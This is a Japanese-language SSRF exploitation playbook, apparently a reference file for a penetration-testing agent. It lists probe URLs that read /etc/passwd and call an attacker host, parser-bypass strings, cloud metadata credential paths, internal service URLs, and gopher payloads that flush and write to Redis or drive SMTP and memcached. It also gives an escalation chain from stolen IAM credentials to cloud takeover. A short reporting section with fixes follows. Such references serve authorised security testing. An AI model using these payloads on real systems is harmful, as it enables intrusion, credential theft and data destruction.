# SSRF — Response-Visible Exploitation

`server-side` の Phase 2 から呼ばれる、応答に fetch 結果が body / file / image / iframe で返る経路の深掘り。応答が見えない blind は `references/ssrf-blind.md`。

## いつ切替えるか

- 入力 URL の応答が body / file / image / iframe で**返ってくる**経路で発火
- preview generator / file converter / OG fetcher / RSS reader / SAML metadata fetcher

## Phase 1 — 確認

```
?url=http://localhost/         → response body に index.html が出ればヒット
?url=file:///etc/passwd        → file scheme が許せば内容表示
?url=https://attacker/x.png    → DNS / HTTP 双方確認 (OAST と併用可)
```

## Phase 2 — URL parser bypass

```
http://target/        → 通常
http://target.attacker.com/                # subdomain 経由 (allowlist 緩い実装)
http://target@attacker.com/                # userinfo 部
http://target#@attacker.com/               # fragment
http://target?x=@attacker.com/             # query
http://target/redirect?next=http://internal # open redirect 経由
http://attacker.com:80\@target/            # backslash trick
http://0:80/                                # 0.0.0.0 alias
http://2130706433/                          # decimal IP (127.0.0.1)
http://0177.0.0.1/                          # octal
http://0x7f.0.0.1/                          # hex
http://[::]/                                # IPv6 localhost
http://[::ffff:127.0.0.1]/
```

## Phase 3 — Cloud metadata

`references/ssrf-blind.md` Phase 5 と同じ。response が見えるなら直接 token / role 取得:

```
GET /latest/meta-data/iam/security-credentials/
GET /latest/meta-data/iam/security-credentials/<role>
```

返却 JSON に AccessKey / Secret / Session token が含まれる。

## Phase 4 — 内部サービス到達

```
http://127.0.0.1:6379/info       # Redis (RESP は HTTP として扱われ部分応答)
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:5984/_all_dbs   # CouchDB
http://127.0.0.1:8500/v1/agent/services  # Consul
http://127.0.0.1:8081/...        # Sonatype Nexus / 内部 admin
```

## Phase 5 — protocol smuggling

```
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20rce%20payload%0d%0a
gopher://127.0.0.1:25/_HELO%20a%0d%0aMAIL%20FROM:...
gopher://127.0.0.1:11211/_set%20x%201%200%2010%0d%0a...      # memcached
file:///etc/passwd
file:///proc/self/environ
dict://127.0.0.1:6379/info
ldap://internal-ldap/
```

## Phase 6 — DNS rebinding / TOCTOU

`references/ssrf-blind.md` Phase 7 と同じ。response visible でも allow → fetch → re-resolve の隙を狙うパターンは効く。

## Phase 7 — escalation chain

| metadata 取得後 | 次手 |
|---|---|
| AWS IAM creds | `aws sts get-caller-identity` → 権限列挙 → `cloud-pentester` |
| GCP token | `Authorization: Bearer` で内部 GCP API 呼出 |
| Azure managed identity | Graph token に交換 |
| 内部 admin の credentials | 横展開 / lateral |

## Phase 8 — レポート

```
- 注入点 / 入力経路
- 内部到達した URL / response 例 (機密 redact)
- metadata から取得した role 名 (token は伏字)
- 影響 (内部 admin 到達 / 認証 bypass / cloud takeover の可能性)
- 修正 (private IP block / IMDSv2 強制 / URL parser 厳格化)
```

## Tools

```
curl
gopherus
ffuf
WebFetch
Bash (sandbox)
mitmproxy / burp
```
